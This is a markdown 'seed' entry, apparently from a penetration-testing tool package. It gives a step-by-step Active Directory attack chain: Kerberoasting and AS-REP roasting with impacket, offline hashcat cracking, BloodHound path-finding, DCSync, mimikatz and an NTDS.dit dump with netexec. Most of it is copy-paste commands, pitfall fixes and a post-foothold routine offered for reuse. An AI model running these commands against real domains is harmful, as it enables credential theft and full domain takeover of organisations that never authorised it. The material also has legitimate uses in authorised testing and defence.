# [seed] Kerberoasting → Offline Cracking → DA

## Scenario classification
Penetration testing / AD attacks

## Target overview
With an ordinary domain user credential and service accounts with SPNs configured in the target domain, Kerberoasting yields TGSs for offline brute force; once a plaintext password is cracked, a BloodHound path leads straight to DA.

## Complete execution chain

1. Foothold in the domain (any ordinary user, no local admin needed)
2. Enumerate SPNs
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. See which accounts have SPNs (usually SQL Server / IIS / custom service accounts)
4. Offline cracking
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack the password of some svc account → check this account's reachable paths in BloodHound
6. If the account is in a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → DCSync directly
7. If not, but it can RDP/WinRM into a key machine → get in and dump with mimikatz, chaining to DA

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| GetUserSPNs returns nothing | The current user lacks permission to read SPNs | Any ordinary domain user can; probably a wrong -dc-ip or PreAuth failed | 20min |
| Hours of cracking without result | Strong password | 1) Switch wordlists (rockyou.txt + corp keywords)  2) Use the GPU (hashcat -d 1)  3) Try the OneRuleToRuleThemAll rule set | Hours |
| Login fails with the cracked password | The credential expired or is case-sensitive | Verify with nxc first: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | GPO/ACL were missing from the collection | `bloodhound-python -c All` must include All; the new BHCE recommends `--zip` | 30min |
| AS-REP Roasting found no targets | Few accounts have "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain findings

- **impacket-GetUserSPNs** is the de facto standard, more cross-platform than PowerView
- **netexec (nxc)** succeeds CrackMapExec, is fast and ships modules such as spider_plus / lsassy / ntds
- **BloodHound Community Edition (BHCE)** is the new version, much faster than the old BloodHound
- The **OneRuleToRuleThemAll** rule set gives the best password cracking results
- **bloodyAD** is a new-generation AD tool focused on "low-privilege ACL abuse for privilege escalation"

## Key code/commands

Complete Kerberoasting flow:

```bash
# 1. verify the credential
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. extract TGSs
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP while at it
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. offline brute force
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. collect BloodHound after getting the password
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. find paths: mark the svc account as Owned and check Shortest Path to DA
```

If the svc account can use SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# dump NTDS.dit directly
```

## Improvement suggestions for this package

- `pentest-tools/references/network-attack-defense.md` should have a complete Kerberoasting chapter
- BloodHound CE is now mainstream; the bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Add `pentest-tools/references/ad-cheatsheet.md` covering the major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page

## Reusable patterns/script snippets

**Standard 30-minute actions after a domain foothold**:

```text
1. nxc smb to verify credentials + spider shares automatically
2. GetUserSPNs + GetNPUsers in one go
3. bloodhound-python -c All collection
4. Offline brute force in parallel (GPU running)
5. While waiting, go through BloodHound for Tier 0 / pre-built attack paths
6. Password cracked → mark Owned → check paths again
```

**AD Kerberos hashcat mode quick reference**:

| Mode | Use |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution actions
- [ ] Add ad-cheatsheet.md
- [ ] Check the nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] The routing matrix already includes Kerberos / Kerberoasting

## Environment information
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: any foothold in the domain (ordinary domain user)

## Redaction requirements
This entry is seed data, written from public AD attack technique patterns, with no real target domain involved.
